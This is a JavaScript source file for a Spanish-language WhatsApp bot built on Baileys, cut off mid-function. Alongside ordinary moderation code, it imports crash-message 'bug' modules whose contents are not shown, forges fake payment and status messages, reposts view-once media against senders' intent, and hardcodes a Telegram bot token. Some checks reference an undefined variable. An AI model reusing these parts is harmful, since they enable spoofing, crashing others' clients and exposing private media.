require('./lib/listmenu')
const {
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType
} = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const { color } = require('./lib/color')
const chalk = require('chalk')
const moment = require('moment-timezone')
moment.locale('es')
const cron = require('node-cron')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const yts = require('yt-search')
const gis = require('g-i-s')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const fg = require('api-dylux')
const googleTTS = require('google-tts-api')
const jsobfus = require('javascript-obfuscator')
const {translate} = require('@vitalets/google-translate-api')
const scp2 = require('./lib/scraper2') 
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./lib/uploader')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./lib/converter')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer,
    buffergif,
    totalcase
} = require('./lib/myfunc')
//prem owner function
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')
//data
let ntnsfw = JSON.parse(fs.readFileSync('./src/data/function/nsfw.json'))
let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'))
let premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'))
const owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'))
//media
const VoiceNote = JSON.parse(fs.readFileSync('./Media/database/vn.json'))
const Sticker = JSON.parse(fs.readFileSync('./Media/database/sticker.json'))
const Image = JSON.parse(fs.readFileSync('./Media/database/image.json'))
const Video = JSON.parse(fs.readFileSync('./Media/database/video.json'))
const Doc = JSON.parse(fs.readFileSync('./Media/database/doc.json'))
const Zip = JSON.parse(fs.readFileSync('./Media/database/zip.json'))
const Apk = JSON.parse(fs.readFileSync('./Media/database/apk.json'))

//bug database
const { xeontext1 } = require('./src/data/function/XBug/xeontext1')
const { xeontext2 } = require('./src/data/function/XBug/xeontext2')
const { xeontext3 } = require('./src/data/function/XBug/xeontext3')
const { xeontext4 } = require('./src/data/function/XBug/xeontext4')
const { xeontext5 } = require('./src/data/function/XBug/xeontext5')

const verifieduser = JSON.parse(fs.readFileSync('./src/data/role/user.json'))

global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

let vote = db.data.others.vote = []
let kuismath = db.data.game.math = []

//tiempo
const xtime = moment.tz('America/Lima').format('HH:mm:ss')
const xdate = moment.tz('America/Lima').format('DD/MM/YYYY')
const time2 = moment().tz('America/Lima').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var ytimewisher = `Buenas noches 🌌`
 }
 if(time2 < "19:00:00"){
var ytimewisher = `Buenas tardes 🌃`
 }
 if(time2 < "18:00:00"){
var ytimewisher = `Buenas tardes 🌃`
 }
 if(time2 < "15:00:00"){
var ytimewisher = `Buenas tardes 🌅`
 }
 if(time2 < "11:00:00"){
var ytimewisher = `Buenos días 🌄`
 }
 if(time2 < "05:00:00"){
var ytimewisher = `Buenos días 🌄`
 } 
//función
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
//module
module.exports = SenseiOfc = async (SenseiOfc, m, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        var prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : xprefix
        const isCmd = body.startsWith(prefix, '')
        const isCmd2 = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const command2 = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await SenseiOfc.decodeJid(SenseiOfc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
       //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const ybody = body.startsWith(pric)
        const isCommand = ybody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
       //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await SenseiOfc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        //anti media
        const isErikMedia = m.mtype
        //user status
        const isUser = verifieduser.includes(sender)
        const TheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium= TheCreator || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(SenseiOfc, m, premium)
        
        //theme sticker reply
        const StickWait = () => {
        let StikRep = fs.readFileSync('./Media/theme/sticker_reply/wait.webp')
        SenseiOfc.sendMessage(from, { sticker: StikRep }, { quoted: m })
        }
        const StickAdmin = () => {
        let StikRep = fs.readFileSync('./Media/theme/sticker_reply/admin.webp')
        SenseiOfc.sendMessage(from, { sticker: StikRep }, { quoted: m })
        }
        const StickBotAdmin = () => {
        let StikRep = fs.readFileSync('./Media/theme/sticker_reply/botadmin.webp')
        SenseiOfc.sendMessage(from, { sticker: StikRep }, { quoted: m })
        }
        const StickOwner = () => {
        let StikRep = fs.readFileSync('./Media/theme/sticker_reply/owner.webp')
        SenseiOfc.sendMessage(from, { sticker: StikRep }, { quoted: m })
        }
        const StickGroup = () => {
        let StikRep = fs.readFileSync('./Media/theme/sticker_reply/group.webp')
        SenseiOfc.sendMessage(from, { sticker: StikRep }, { quoted: m })
        }
        const StickPrivate = () => {
        let StikRep = fs.readFileSync('./Media/theme/sticker_reply/private.webp')
        SenseiOfc.sendMessage(from, { sticker: StikRep }, { quoted: m })
        }
        //premium
        async function replyprem(teks) {
    replygc(`Esta función es para usuarios premium, comuníquese con el propietario para convertirse en usuario premium`)
}
        //script replier
        async function sendSenseiOfcMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await SenseiOfc.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
        //reply
        async function replygc(teks) {
            if (typereply === 'v1') {
                m.reply(teks)
            } else if (typereply === 'v2') {
                SenseiOfc.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                            sourceUrl: wagc
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                });
            } else if (typereply === 'v3') {
               SenseiOfc.sendMessage(m.chat, {
                  text: teks,
                  contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: ownername,
                        thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                        sourceUrl: websitex,
                        mediaType: 1,
                        renderLargerThumbnail: true
                     }
                  }
               }, { quoted: m })
            }
        }
        let fstatus = { 
            key: { 
               fromMe: false, 
               participant: `0@s.whatsapp.net`,  
               ...(m.chat ? {  remoteJid: "status@broadcast"  } : {}) 
            }, 
               message: {  
                  "imageMessage": { 
                     "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", 
                     "mimetype": "image/jpeg", 
                     "caption": botname,
                     "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", 
                     "fileLength": "28777",
                     "height": 1080,
                     "width": 1079,
                     "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                     "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                     "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                     "mediaKeyTimestamp": "1610993486",
                     "jpegThumbnail": await reSize(thumb, 100, 100),
                     "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                  }
               }
            }
            
            //Fake quoted
        const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id:global.botname, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.botname}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":false},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./Media/theme/menu.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
	    const frpayment = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}
            
            const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
        
        //database
        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? 1000 : 100
            let user = global.db.data.users[sender]
            if (typeof user !== 'object') global.db.data.users[sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('badword' in user)) user.badword = 0
                if (!('title' in user)) user.title = ''
                if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex') 
                if (!('afkReason' in user)) user.afkReason = ''
                if (!('nick' in user)) user.nick = SenseiOfc.getName(sender)
                if (!isPremium) user.premium = false
                if (!('totalLimit' in user)) user.totalLimit = 0
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[sender] = {
               serialNumber: randomBytes(16).toString('hex'),
               title: `${isPremium ? 'Premium' : 'User'}`,
               afkTime: -1,
               badword: 0,
               afkReason: '',
               nick: SenseiOfc.getName(sender),
               premium: `${isPremium ? 'true' : 'false'}`,
               limit: limitUser,
               totalLimit: 0
            }
            
               let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                  if (!('badword' in chats)) chats.badword = false
                  if (!('antiforeignnum' in chats)) chats.antiforeignnum = false
                  if (!('antibot' in chats)) chats.antibot = false
                  if (!('antiviewonce' in chats)) chats.antiviewonce = false
                  if (!('antimedia' in chats)) chats.media = false
                  if (!('antivirtex' in chats)) chats.antivirtex = false
                  if (!('antiimage' in chats)) chats.antiimage = false
                  if (!('antivideo' in chats)) chats.video = false
                  if (!('antiaudio' in chats)) chats.antiaudio = false
                  if (!('antipoll' in chats)) chats.antipoll = false
                  if (!('antisticker' in chats)) chats.antisticker = false
                  if (!('anticontact' in chats)) chats.anticontact = false
                  if (!('antilocation' in chats)) chats.antilocation = false
                  if (!('antidocument' in chats)) chats.antidocument = false
                  if (!('antilink' in chats)) chats.antilink = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
               } else global.db.data.chats[from] = {
                  badword: false,
                  antiforeignnum: false,
                  antibot: false,
                  antiviewonce: false,
                  antivirtex: false,
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antilink: false,
                  antilinkgc: false
               }
            
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
               if (!('totalhit' in setting)) setting.totalhit = 0
               if (!('totalError' in setting)) setting.totalError = 0
               if (!('online' in setting)) setting.online = false 
               if (!('autosticker' in setting)) setting.autosticker = false 
               if (!('autobio' in setting)) setting.autobio = false 
               if (!('autoread' in setting)) setting.autoread = false
               if (!('autorecordtype' in setting)) setting.autorecordtype = false
               if (!('autorecord' in setting)) setting.autorecord = false
               if (!('autotype' in setting)) setting.autotype = false
               if (!('autoblocknum' in setting)) setting.autoblocknum = false
               if (!('onlyindia' in setting)) setting.onlyindia = false
               if (!('onlyindo' in setting)) setting.onlyindo = false
               if (!('onlygrub' in setting)) setting.onlygrub = false
               if (!('onlypc' in setting)) setting.onlypc = false
               if (!('watermark' in setting)) setting.watermark = { packname , author }
               if (!('about' in setting)) setting.about = { bot: { nick: SenseiOfc.getName(botNumber), alias: botname}, owner: { nick: SenseiOfc.getName(global.ownernumber + '@s.whatsapp.net'), alias: global.ownernumber}}
            } else global.db.data.settings[botNumber] = {
               totalhit: 0,
               totalError: 0,
               online: false,
               autosticker: false,
               autobio: false,
               autoread: false,
               autoblocknum: false,
               onlyindia: false,
               onlyindo: false,
               onlygrub: false,
               onlypc: false,
               autorecordtype: false,
               autorecord: false,
               autotype: false,
               watermark: {
                  packname: global.packname, 
                  author: global.author
               },
               about: {
                  bot: {
                     nick: SenseiOfc.getName(botNumber), 
                     alias: botname
                  },
                  owner: {
                     nick: SenseiOfc.getName(global.ownernumber + '@s.whatsapp.net'), 
                     alias: global.ownernumber
                  }
               }
            }
            
        } catch (err) {
            console.log(err)
        }
        
        async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

//bug loading
async function loading () {
var xeonlod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
]
let { key } = await SenseiOfc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await SenseiOfc.sendMessage(from, {text: xeonlod[i], edit: key })
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
        
        async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygc('Introduzca su URL del enlace del sticker de Telegram')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'DGXeon',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}
        
        // Función de límite
async function useLimit(sender, amount) {
    db.data.users[sender].limit -= amount
    db.data.users[sender].totalLimit += amount
    replygc(`Has utilizado: ${amount} límite\nRestante: ${db.data.users[sender].limit} límite`)
}

async function resetLimit() {
    let users = Object.keys(global.db.data.users)
    let Limitxeon = isPremium ? limit.prem : limit.free
    for (let i of users) {
        db.data.users[i].limit = Limitxeon
    }
    SenseiOfc.sendText('120363167338947238@g.us', { text: `Restablecer límite` })
}

// Solo para grupos
if (!m.isGroup && !TheCreator && db.data.settings[botNumber].onlygrub) {
    if (isCommand) {
        return replygc(`¡Hola amigo! Como queremos reducir el spam, ¡utiliza el bot en el chat grupal!\n\nSi tienes problemas, chatea con el propietario en wa.me/${ownernumber}`)
    }
}

// Solo privado
if (!TheCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
    if (isCommand) {
        return replygc("¡Hola amigo! Si quieres usar este bot, chatea con el bot en un chat privado.")
    }
}

if (!SenseiOfc.public) {
    if (TheCreator && !m.key.fromMe) return
}

if (db.data.settings[botNumber].online) {
    if (isCommand) {
        SenseiOfc.sendPresenceUpdate('no disponible', from)
    }
}

if (db.data.settings[botNumber].autoread) {
    SenseiOfc.readMessages([m.key])
}

// Autoestablecer biografía
if (db.data.settings[botNumber].autobio) {
    SenseiOfc.updateProfileStatus(`${botname} ha estado funcionando durante ${runtime(process.uptime())}`).catch(_ => _)
}
     //auto type record
        if (db.data.settings[botNumber].autorecordtype){
        if (isCommand) {
            let xeonmix = ['composing', 'recording']
            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
            SenseiOfc.sendPresenceUpdate(xeonmix2, from)
        }
        }
        if (db.data.settings[botNumber].autorecord){
        if (isCommand) {
        	let xeonmix = ['recording']
            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
            SenseiOfc.sendPresenceUpdate(xeonmix2, from)
        }
        }
        if (db.data.settings[botNumber].autotype){
        if (isCommand) {
        	let xeonpos = ['composing']
            SenseiOfc.sendPresenceUpdate(xeonpos, from)
        }
        }
        
        //auto block number
        if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
            return SenseiOfc.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('91') && db.data.settings[botNumber].onlyindia === true) {
            return SenseiOfc.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && db.data.settings[botNumber].onlyindo === true) {
            return SenseiOfc.updateBlockStatus(m.sender, 'block')
        } 
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true){ 
        	if (TheCreator || isAdmins || !isBotAdmins) return
            SenseiOfc.sendMessage(m.chat, { text: `¡Lo siento amigo! Serás eliminado porque el administrador/propietario del grupo ha habilitado el anti número extranjero, solo el código de país +${antiforeignnumber} puede unirse al grupo` }, {quoted: m})
            await sleep(2000)
            await SenseiOfc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        let list = []
for (let i of owner) {
list.push({
	    	displayName: await SenseiOfc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await SenseiOfc.getName(i)}\nFN:${await SenseiOfc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
        //console log
        if (isCommand) {
    let fecha = moment().format('LLLL')
    console.log(color(`\n< ================================================== >\n`, 'cyan'))
    console.log(chalk.black(chalk.bgWhite(!isCommand ? '[ MENSAJE ]' : '[ COMANDO ]')), chalk.black(chalk.bgGreen(fecha)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> De'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> En'), chalk.green(m.isGroup ? pushname : 'Chat privado', m.chat))
    global.db.data.settings[botNumber].totalhit += 1
}
        
        //antiviewonce
    if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
    	if (m.isBaileys && m.fromMe) return
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await SenseiOfc.sendMessage(m.chat, { forward: val }, { quoted: m })
    }
        //ANTI VIRUS
if (isGroup && db.data.chats[m.chat].antivirtex) {
